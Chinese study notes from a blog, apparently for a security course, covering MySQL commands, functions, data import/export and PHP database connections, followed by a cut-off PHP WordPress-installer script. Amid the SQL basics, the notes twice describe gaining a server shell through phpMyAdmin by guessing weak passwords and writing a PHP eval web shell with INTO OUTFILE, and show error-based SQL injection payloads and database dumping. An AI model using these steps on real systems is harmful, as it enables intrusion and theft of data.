<p>mysql默认端口3306<br>打开数据库管理器，数据库–&gt;数据表–&gt;字段（表头）<br>表中有几个字段就有几列数据<br>一行数据     专业称为 记录</p>
<p>mysql基础命令：<br>    mysql -h ip -u 用户名 -p 密码<br>    show databases;        查看所有数据库<br>    use test;            使用指定数据库<br>    show tables;        查看数据库内的表</p>
<pre><code>select * from news;    从news表中查看所有的数据内容
        select      查看数据
        *            表示所有字段
        from news   从* *表中去获取数据
</code></pre><p>mysql修改密码：<br>        低版本（5.x）</p>
<pre><code>高版本（8.x）
    ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED  BY &quot;你的新密码&quot;;
</code></pre><p>mysql默认情况下不允许外连，也就意味使用mysql-front、navicat是无法连接到数据库的</p>
<hr>
<p>mysql外连：<br>    （1）改表法<br>            update user set host = “%” where user = “root” and host = “localhost”;//修改数据表<br>    （2）</p>
<hr>
<p>mysql函数：</p>
<pre><code>select version();    显示数据库的版本信息

select user();        当前用户
select current_user()/session_user()/system_user();

mid();                 用来截取字符串中的一部分    mid(&quot;ichunqiu&quot;,0,2)
ord();                用来显示字符的ASCII码        
concat();            用来拼接字符串
concat_ws();        使用分隔符来拼接字符串
group_concat();        和concat类似，拼接并分组显示数据
select databases()/schema();    查看当前数据库
select @@hostname;    获取计算机名称
select @@tmpdir;    获取临时文件目录路径
select @@datadir;    真正存放数据的路径
select @@version;    版本
select @@basedir;    数据库所在位置
</code></pre><hr>
<p>创建数据库<br>    create database ichunqiu;        //交互式窗口<br>    mysqladmin -uroot -proot create ichunqiu2    //dos窗口</p>
<hr>
<p>删除数据库<br>    drop database ichunqiu;<br>    mysqladmin -uroot -proot drop ichunqiu2</p>
<hr>
<p>选择使用哪个数据库<br>    use 数据库名称</p>
<hr>
<p>数据类型：<br>    int，float，date，time，timestamp（时间戳），char，varchar，text</p>
<hr>
<p>创建表<br>    create table stu(id int , name varchar(10));<br>    create table 表名（字段名1 类型1，字段名2 类型2，……）;<br>    show create table stu;<br>    desc 表名</p>
<p>查看字段<br>    show create table 表名;<br>—-注意：IF NOT EXISTS 表示如果创建的表不存在就执行后续sql语句—-<br>    <code></code>–&gt;上引号</p>
<hr>
<p>插入数据<br>    insert into 表名 (字段1，字段2，字段3…,字段名n) value(value1,value2,….,valuen)<br>    —字段1对应value1—</p>
<hr>
<p>查询数据<br>    select 字段名1，字段名2,……，字段名n from 表名；<br>    select <em> from 表名；<br>    select username,password from users where id=1;（单条件）<br>    select </em> from stu where number=311009050115 and name=huqianwei;(多条件)<br>    select 字段名1，字段名2，….，字段名n from 表名 limit 0,1;<br>    –limit a,b  是用来限制读取记录，a是索引，b表示读取的行数–</p>
<hr>
<p>更新数据<br>    update 表名 set 字段名=新值1，字段名2=新值2，…,字段名n=新值n;<br>    update 表名 set 字段名=新值1，字段名2=新值2，…,字段名n=新值n where;</p>
<hr>
<p>删除数据<br>    delete from 表名 where 条件 ；<br>    delete from 表名;                删除表中所有数据</p>
<hr>
<p>like子句</p>
<pre><code>* 表示任意的字符
% 表示任意的字符
? 表示一个字符
select * from stu where 字段名 like &quot;字符串&quot;；
</code></pre><hr>
<p>union 联合查询<br>    select <em> from 表1 union select </em> from 表2;<br>    注意:表1和表2中字段个数要保持一致</p>
<hr>
<p>order by 条件   根据条件排序<br>    select * from 表名 order by 字段名 asc/desc;<br>    —asc 升序，desc 降序—<br>    order by n ,按照第n列的数据进行排序，如果n超过了字段数量是，就会报错 </p>
<hr>
<p>group by  对结果进行分组</p>
<hr>
<p>删除字段<br>    alter table 表名 drop 字段名;  在表中将某个字段删掉</p>
<p>修改字段<br>    alter table 表名 modify 字段名 字段类型;</p>
<p>添加字段<br>    alter table 表名 add 字段名1 字段类型1,add 字段名2 字段类型2;        在表中增加某个字段</p>
<hr>
<p>修改表名<br>    alter table 原表名 rename to 新表名;</p>
<hr>
<p>mysql导入数据<br>    (1)mysql -u 用户名 -p 密码 &lt; 要导入的数据库数据<br>    注意：runoob.sql中要自动创建数据库<br>    如果runoob.sql中不会自动创建数据库，需要执行如下的步骤：<br>            step1：登录数据库mysql -u用户名 -p密码<br>            step2：选择数据库        use mysql;<br>            step3：source 绝对路径<br>    (2)mysqlimport -u root -p –local database_name dump.txt<br>    注意：dump.txt不会创建数据库时，需要database_name</p>
<hr>
<p>mysql导出数据<br>    select * from news into outfile “绝对路径”;<br>    show global variables like ‘%secure_file_priv%’;<br>        临时修改：set global secure_file_priv=’’;<br>        (1)为null时，表示mysql不允许导入导出<br>        (2)为路径时，只允许在路径中导入导出<br>        (3)为无值时，表示不做限制</p>
<hr>
<p>脱裤：<br>    mysqldump -uroot -proot test&gt;D://database.sql<br>脱裤中的表：<br>    mysqldump -uroot -proot mysql stu &gt;D://database2.sql</p>
<hr>
<p>通过phpmyadmin 来获取服务器权限：<br>    step1：首先通过Googlehacking找到phpmyadmin的网站<br>    step2：爆破、弱口令，登录，查看权限，show global variables like     ‘%secure_file_priv%’;<br>    step3：select “&lt;?php eval($_POST[‘pass’]);?&gt;” into outfile “G://“,注意写入木马的路径</p>
<hr>
<p>选择数据的高级用法：<br>    order by 数字; —-&gt;可以用来暴字段数<br>    select 1+1#1+1;<br>    select 1+1;–1+1</p>
<pre><code>select connection_id();   用户连接数

select insert(被替换的的字符串,索引,长度,替换的字符串);
select left(被截取的字符串，截取的长度);   向左截取
select right(被截取的字符串，截取的长度);   向右截取

select substring/mid/substr();    都是三个参数，第一个被截取的字符串，第二个是开始位置，第三个是截取的长度    
select sleep(5);  让数据库等待5s后返回0
</code></pre><hr>
<pre><code>2个报错函数
extractvalue(XML_document，XPath_string):
    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
    第二个参数：XPath_string(Xpath格式为字符串)
    作用：从目标XML中返回包含所查询值的字符串
    select * from user where user=&apos;root&apos; and extractvalue(1,concat(0x7e,(select user()),0x7e));
    ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;

    select * from user where user=&apos;root&apos; and extractvalue(1,concat(0x7e,(select @@datadir),0x7e));
    ERROR 1105 (HY000): XPATH syntax error: &apos;~D:\phpstudy\PHPTutorial\MySQL\d&apos;

    concat(0x7e,(select user()),0x7e)


updatexml(xml_document,xpath,)
    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
    第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
    第三个参数：new_value，String格式，替换查找到的符合条件的数据 
    作用：改变文档中符合条件的节点的值

    select * from user where user =&apos;root&apos;and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

    ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;
</code></pre><hr>
<p>distinct去重：<br>    SELECT  DISTINCT 字段 FROM 表名 WHERE 条件；</p>
<p>group_concat把查询结果连接到一起：<br>    SELECT  group_concat(DISTINCT 字段) FROM 表名 WHERE 条件 ；<br>    SELECT  group_concat(字段，字段) FROM 表名 WHERE 条件 ；</p>
<hr>
<hr>
<h2 id="ubuntu16-mysql"><a href="#ubuntu16-mysql" class="headerlink" title="ubuntu16  mysql "></a>ubuntu16  mysql </h2><p>安装：</p>
<pre><code> 安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的 ，我的就没提示，可以用上面的方法修改密码
sudo apt-get install mysql-client mysql-server

#检查mysql是不是在运行
sudo service mysql status
#一般安装完成之后都是会自动运行的，如果没有运行可以start
sudo service mysql start
</code></pre><hr>
<p> 修改密码：</p>
<pre><code>update user set authentication_string=PASSWORD(&quot;密码&quot;) where user = &quot;root&quot;;
update user set plugin=&quot;mysql_native_password&quot;;
flush privileges;
quit;
</code></pre><p>重启mysql</p>
<pre><code>/etc/init.d/mysql restart;
</code></pre><hr>
<p>卸载mysql：</p>
<pre><code>sudo apt purge mysql-*
sudo rm -rf /etc/mysql/ /var/lib/mysql
sudo apt autoremove
</code></pre><hr>
<hr>
<p>PHP连接mysql数据库</p>
<pre><code>(1)使用mysqli去连接
mysqli_connect(&quot;IP&quot;,&quot;pwd&quot;)


create table if not exists `te`(`id` int auto_INCREMENT,`name` varchar(100) not null,`age` int(100) not null,`gender` bool,PRIMARY KEY (`id`))
</code></pre><hr>
<h2 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h2><p>往表中插入数据：</p>
<pre><code>    insert into 表名称(字段1，字段2...) value(字段1的值，字段2的值...)
例子：insert into news(title,content) value(&apos;标题&apos;,&apos;内容‘)；
</code></pre><p>查询数据：</p>
<pre><code>select 字段名1,字段名2,...,字段名n from 表名称

select username,password from user where id =1;单条件

select * from stu where number=31100 and name=hu;多条件用and连接

select 字段1，字段2，字段n from 表名 limit 0,1；用limit加限制条件 从0开始读1条

limit a,b  limit---限制读取记录   a---索引  b----记录数
</code></pre><p>更新：</p>
<pre><code>update 表名 set 字段1=新值1，字段2=新值2 条件；
</code></pre><p>删除表：</p>
<pre><code>delete from 表名 条件；一定要加好条件，否则都删了

delete from 表名；清空一个表
</code></pre><p>like子句：</p>
<pre><code>通配符：
    *表示任意的字符
    %表示任意的字符
    ？表示任意一个字符
    select * from 表名  where name like &apos;%sd&apos;;
</code></pre><p>union***    联合查询</p>
<pre><code>select * from 表1 union select * from 表2；把表1和表2内容放在一起展示
注意：表1和表2中字段个数要保持一致，否则会报错
</code></pre><p>order by 条件***    根据条件排序</p>
<pre><code>select * from user where city =&apos;beijng&apos; order by name;
ASC（升序） 或DESC（降序）默认升序
order by 1\2\3.。。 根据第几列来排序，如果超过列数就会报错*****
</code></pre><p>group by 根据一个或多个列对结果进行分组，常和count sum、AVG组合使用</p>
<pre><code>select name，count（*）from  emply by name；根据名字来给表分组；
</code></pre><p>删除字段：<br>        alter table 表名  drop 字段名；在表中将某个字段删除</p>
<p>增加字段：<br>        alter table 字段名 add 字段名 字段类型</p>
<p>改字段：<br>        alter table to modify 字段名 字段类型;</p>
<p>改表名：<br>        alter table 原表名 rename to  新表名;</p>
<p>导入数据：</p>
<pre><code>方法1.mysql -uroot -p 密码 &amp;lt; 要导入的数据（注意：.sql中要自动创建数据库，如果runoob.sql中不会自动创建数据库，需要用第二种方法）

方法2.登录mysql，use数据库，source 路径文件

方法3.mysqlimport -uroot -p --local database_name dump.txt dump.txt（注意：dump.txt不会创建数据库时，需要database_name）
</code></pre><p>导出数据：</p>
<pre><code>方法1.select * from 表名 into outfile 文件路径；


在此导出权限查询：show gloval variables like  &apos;%secure%&apos;; 
在mysql.ini中添加一句话secure_file_priv=
或者临时修改权限set global secure_file_priv=&apos;&apos;;

通过phpmyadmin来获取服务器权限：（getshell）

step1：首先通过google hacking找到phpmyadmin网站

step2：想办法登录进phpmyadmin，弱口令登录
show global variables like ‘%secure_file_priv%&apos;;判断是否有权限写入文件

step3：select ’&amp;lt;?php eval($_POST[_]);?&amp;gt;&apos; into outfile &apos;g://re2.txt&apos;； 注意些木马的路径   一般是/var/www/html/

方法2.在cmd中mysqldump -uroot -p test&amp;gt;./database.sql

mysqldump -u用户名 -p密码  数据库名 表名 &amp;gt;路径
</code></pre><p>注释<em>**</em>注入</p>
<pre><code>#（%23） --  注释当前行
/*  */      中间注释
</code></pre><p>查询用户连接数</p>
<pre><code>select connection_id();
</code></pre><p>替换字符        </p>
<pre><code>例子
    select insert(&apos;ichunqiu&apos;,1,1,&apos;kk&apos;);结果是kkchunqiu
</code></pre><p>截取字符串</p>
<pre><code>例子
    select LEFT(&quot;helloworld&quot;,5);结果是hello
    select LEFT（被截取的字符串，左截取长度）;
    select RIGHT 同理

截取
    select substring()/mid()/substr()都是三个参数，第一个：被截取的字符串，第二个：开始的位置，第三个：截取的长度
</code></pre><p>休息命令</p>
<pre><code>select sleep(时间秒)
例子select sleep（5）;返回0    //让服务器等待5秒后返回0
</code></pre><p>2个报错函数***  一般情况下要放在条件后面</p>
<pre><code>1.extractvalue(XML_document，XPath_string)；
例子：
select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));
两个参数（1，拼接的第二个报错参数）

2.UPDATEXML (XML_document, XPath_string, new_value); 
updatexml（1，拼接参数，1）；
</code></pre><p>去重函数<br>        select distinct title from news;不显示重复函数</p>
<p>把查询结果连接在一起</p>
<pre><code>group_concat(DISTINCT field) from table_name where conditions;
</code></pre><p>PHP连接mysql数据库</p>
<pre><code>方法1：使用mysqli扩展连接(面向对象)
&amp;lt;?php
$dbhost = &apos;localhost:3306&apos;;  // mysql服务器主机地址
$dbuser = &apos;root&apos;;            // mysql用户名
$dbpass = &apos;123456&apos;;          // mysql用户名密码
$conn = mysqli_connect($dbhost, $dbuser, $dbpass);
if(! $conn )
{
    die(&apos;连接失败: &apos; . mysqli_error($conn));
}
// 设置编码，防止中文乱码
mysqli_query($conn , &quot;set names utf8&quot;);

$sql = &apos;SELECT runoob_id, runoob_title, 
        runoob_author, submission_date
        FROM runoob_tbl&apos;;

mysqli_select_db( $conn, &apos;RUNOOB&apos; );
$retval = mysqli_query( $conn, $sql );
if(! $retval )
{
    die(&apos;无法读取数据: &apos; . mysqli_error($conn));
}
echo &apos;&amp;lt;h2&amp;gt;菜鸟教程 mysqli_fetch_array 测试&amp;lt;h2&amp;gt;&apos;;
echo &apos;&amp;lt;table border=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;教程 ID&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;标题&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;作者&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;提交日期&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&apos;;
while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))
{
    echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; {$row[&apos;runoob_id&apos;]}&amp;lt;/td&amp;gt; &quot;.
         &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_title&apos;]} &amp;lt;/td&amp;gt; &quot;.
         &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_author&apos;]} &amp;lt;/td&amp;gt; &quot;.
         &quot;&amp;lt;td&amp;gt;{$row[&apos;submission_date&apos;]} &amp;lt;/td&amp;gt; &quot;.
         &quot;&amp;lt;/tr&amp;gt;&quot;;
}
echo &apos;&amp;lt;/table&amp;gt;&apos;;
mysqli_close($conn);
?&amp;gt;


或者写成m面向对象：
        &amp;lt;?php
header(&quot;content-type:text/html;charset=utf-8&quot;); 
$mysql_conf=array(&apos;host&apos;=&amp;gt;&apos;127.0.0.1&apos;,&apos;username&apos;=&amp;gt;&apos;root&apos;,&apos;password&apos;=&amp;gt;&apos;root&apos;,&apos;database&apos;=&amp;gt;&apos;test&apos;,);//定义的数组 =&amp;gt;
$mysqli=new mysqli($mysql_conf[&apos;host&apos;],$mysql_conf[&apos;username&apos;],$mysql_conf[&apos;password&apos;]);//连接数据库
//new 对象，实例化
if ($mysqli-&amp;gt;connect_error) {
    die(&quot;not connect to database server&quot;.$mysqli-&amp;gt;connect_error);//connect_error该变量存储连接服务时的错误信息，若没有，则说明连接成功
}
$mysqli-&amp;gt;query(&quot;set names &apos;utf8&apos;&quot;);//设置编码方式
$db=$mysqli-&amp;gt;select_db($mysql_conf[&apos;database&apos;]);//选择数据库

if (!$db) {
    die(&apos;not connect to the db&apos;.$mysqli-&amp;gt;error);//error变量存储连接数据库的错误信息，
}

$sql=&quot;select * from news where tid=1&quot;; //这是要执行的sql语句

$conn=$mysqli-&amp;gt;query($sql);//执行sql语句
//var_dump($conn);
if (!$conn) {
    die(&apos;sql is error&apos;.$mysqli-&amp;gt;error);
}

while ($row=$conn-&amp;gt;fetch_array(MYSQLI_ASSOC)) {//fetch_assoc该方法将执行完sql语句的结果转换为数组
    //var_dump($row);
    echo &quot;&amp;lt;pre&amp;gt;&quot;;
        //print_r($row);
        echo $row[&apos;content&apos;];
        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
}

$conn-&amp;gt;free();//释放执行sql语句的资源
$mysqli-&amp;gt;close();//释放连接数据库服务的资源


// mysqli_fetch_assoc(), 该函数从结果集中取得一行作为关联数组 ,返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。
// mysqli_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。




执行数据库语句（成功返回0，失败返回1）
$result=mysqli_query($conn,$create_db_sql);

方法2：使用mysql扩展（php低于5.5）

方法3：使用PDO技术（面向对象的，防止sql注入）接下一篇：
</code></pre><hr>
<h2 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h2><p>方法3：使用PDO技术（面向对象的，防止sql注入）</p>
<pre><code>$mysql_conf=array(
&apos;host&apos;=&amp;gt;&apos;127.0.0.1:3306&apos;,
&apos;db&apos;=&amp;gt;&apos;test&apos;,
&apos;db_user&apos;=&amp;gt;&apos;root&apos;,
&apos;db_pwd&apos;=&amp;gt;&apos;123456&apos;,
);
//$pdo = new PDO(&quot;mysql:host=&quot;.$mysql_conf[&apos;host&apos;].&quot;;dbname=&quot;.$mysql_conf[&apos;db&apos;],&quot;db_user=&quot;.$mysql_conf[&apos;db_user&apos;],&quot;db_pwd=&quot;.$mysql_conf[&apos;db_pwd&apos;]);

$pdo = new PDO(&quot;mysql:host=&quot; . $mysql_conf[&apos;host&apos;] . &quot;;dbname=&quot; . $mysql_conf[&apos;db&apos;], $mysql_conf[&apos;db_user&apos;], $mysql_conf[&apos;db_pwd&apos;]);//$dsn = &quot;mysql:dbname=test;host=127.0.0.1&quot;;

$pdo-&amp;gt;exec(&quot;set names &apos;utf8&apos;&quot;);
$sql=&quot;select * from food where id=3&quot;;
$stmt=$pdo-&amp;gt;prepare($sql);
$stmt-&amp;gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR);
$rs=$stmt-&amp;gt;execute();
if ($rs){
    while ($row=$stmt-&amp;gt;fetch(PDO::FETCH_ASSOC)){
        var_dump($row);
    }
}
$pdo=null;
?&amp;gt;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2018/12/16/php简陋实现wordpress安装流程/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/16/php简陋实现wordpress安装流程/" itemprop="url">php简陋实现wordpress安装流程</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-12-16T22:33:02+08:00">
                2018-12-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="anzhuang-php"><a href="#anzhuang-php" class="headerlink" title="anzhuang.php"></a>anzhuang.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Administrator</span></span><br><span class="line"><span class="comment"> * Date: 2018/12/15</span></span><br><span class="line"><span class="comment"> * Time: 17:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$step =<span class="number">0</span>;</span><br><span class="line">@$step = $_POST[<span class="string">'step'</span>];</span><br><span class="line">@$language = $_POST[<span class="string">'language'</span>];</span><br><span class="line"><span class="comment">/*@$sqlname= $_POST['sqlname'];</span></span><br><span class="line"><span class="comment">@$username = $_POST['username'];</span></span><br><span class="line"><span class="comment">@$passwd = $_POST['passwd'];</span></span><br><span class="line"><span class="comment">@$sqlhost = $_POST['sqlhost'];</span></span><br><span class="line"><span class="comment">@$tbname = $_POST['tbname'];*/</span></span><br><span class="line">$_POST[<span class="string">'sqlname'</span>] = <span class="string">"wordpress"</span>;</span><br><span class="line">$_POST[<span class="string">'username'</span>] = <span class="string">"root"</span>;</span><br><span class="line">$_POST[<span class="string">'passwd'</span>] = <span class="string">"root"</span>;</span><br><span class="line">$_POST[<span class="string">'sqlhost'</span>] = <span class="string">"localhost"</span>;</span><br><span class="line">$_POST[<span class="string">'tbname'</span>] = <span class="string">"wp_"</span>;</span><br><span class="line">@$uname = $_POST[<span class="string">'uname'</span>];</span><br><span class="line">@$upasswd = $_POST[<span class="string">'upasswd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($step == <span class="number">0</span>)&#123;</span><br><span class="line">step0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($step == <span class="number">1</span>)&#123;</span><br><span class="line">step1();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($step == <span class="number">2</span> )&#123;</span><br><span class="line">step2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($step == <span class="number">3</span> ) &#123;</span><br><span class="line">step3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($step == <span class="number">5</span>)&#123;</span><br><span class="line">successful();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($step == <span class="number">6</span>)&#123;</span><br><span class="line">success();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($step == <span class="number">7</span>)&#123;</span><br><span class="line">wordpress();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始页面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step0</span><span class="params">()</span></span>&#123;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;WordPress&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" name="step" value="1"&gt;开始安装&lt;/button&gt;  </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $step1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一步--&gt;选择安装语言</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step1</span><span class="params">()</span></span>&#123;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;请选择安装语言：&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;select name="language"&gt;</span></span><br><span class="line"><span class="string"> &lt;option value="ysyy"&gt;英式英语&lt;/option&gt;</span></span><br><span class="line"><span class="string"> &lt;option value="zhjt"&gt;中文简体&lt;/option&gt;</span></span><br><span class="line"><span class="string"> &lt;option value="msyy"&gt;美式英语&lt;/option&gt;</span></span><br><span class="line"><span class="string"> &lt;option value="zhft"&gt;中文繁体&lt;/option&gt;</span></span><br><span class="line"><span 